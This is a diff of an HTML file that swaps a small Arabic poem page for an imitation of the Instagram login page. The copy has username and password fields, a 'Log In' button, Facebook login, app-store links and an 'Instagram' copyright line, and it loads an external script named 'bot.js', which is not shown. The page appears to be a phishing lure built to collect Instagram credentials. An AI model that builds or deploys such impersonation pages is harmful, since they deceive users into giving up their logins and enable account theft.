@@ -1,61 +1,79 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الأبيات الشعرية</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            text-align: center;
-            margin-top: 50px;
-            line-height: 2;
-        }
-        .poem {
-            font-size: 20px;
-            margin-bottom: 20px;
-        }
-        input[type="text"] {
-            width: 300px;
-            padding: 10px;
-            margin-top: 20px;
-            font-size: 16px;
-        }
-        button {
-            padding: 10px 20px;
-            margin-top: 10px;
-            font-size: 16px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login Page</title>
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 
-    <h1>الأبيات الشعرية</h1>
-    <div class="poem">
-        <p>عبرتُ دروب العلم بحثًا عن اليقين</p>
-        <p>بنوره تجلت رؤى العالمين</p>
-        <p>دروب المجد تزهر في خطى المتقين</p>
-        <p>السعي يعانق طموح الراغبين</p>
-        <p>ماضون نحو الخير رغم الصعاب</p>
-        <p>حقائق العمر تبنى على صبر الشباب</p>
-        <p>سبل النجاح تنادي بجهد وعطاء</p>
-        <p>نحيا بها للأمل وننسى العناء</p>
+<div class="wrapper">
+  <div class="header">
+    <div class="top">
+      <div class="logo">
+        <img src="instagram.png" alt="instagram" style="width: 175px;">
+      </div>
+      <div class="form">
+        <div class="input_field">
+          <input type="text" placeholder="Phone number, username, or email" class="input" id="username">
+        </div>
+        <div class="input_field">
+          <input type="password" placeholder="Password" class="input" id="password">
+        </div>
+        <div class="btn">
+          <button type="button" id="loginButton">Log In</button>
+        </div>
+      </div>
+      <div class="or">
+        <div class="line"></div>
+        <p>OR</p>
+        <div class="line"></div>
+      </div>
+      <div class="dif">
+        <div class="fb">
+          <img src="facebook.png" alt="facebook">
+          <p>Log in with Facebook</p>
+        </div>
+        <div class="forgot">
+          <a href="#">Forgot password?</a>
+        </div>
+      </div>
     </div>
+    <div class="signup">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+    <div class="apps">
+      <p>Get the app.</p>
+      <div class="icons">
+        <a href="#"><img src="appstore.png" alt="appstore"></a>
+        <a href="#"><img src="googleplay.png" alt="googleplay"></a>
+      </div>
+    </div>
+  </div>
+  <div class="footer">
+    <div class="links">
+      <ul>
+        <li><a href="#">ABOUT US</a></li>
+        <li><a href="#">SUPPORT</a></li>
+        <li><a href="#">PRESS</a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">JOBS</a></li>
+        <li><a href="#">PRIVACY</a></li>
+        <li><a href="#">TERMS</a></li>
+        <li><a href="#">DIRECTORY</a></li>
+        <li><a href="#">PROFILES</a></li>
+        <li><a href="#">HASHTAGS</a></li>
+        <li><a href="#">LANGUAGE</a></li>
+      </ul>
+    </div>
+    <div class="copyright">
+      © 2025 INSTAGRAM
+    </div>
+  </div>
+</div>
 
-    <input type="text" id="answer" placeholder="اكتب إجابتك هنا">
-    <br>
-    <button onclick="submitAnswer()">أرسل</button>
-
-    <script>
-        function submitAnswer() {
-            const answer = document.getElementById("answer").value;
-            const email = "brazdamiwr@outlook.com"; // ضع بريدك الإلكتروني هنا
-            const subject = "إجابة على الأبيات الشعرية";
-            const body = "الإجابة: " + answer;
-
-            window.open(`mailto:${email}?subject=${subject}&body=${body}`);
-        }
-    </script>
+<script src="bot.js"></script>
 
 </body>
 </html>
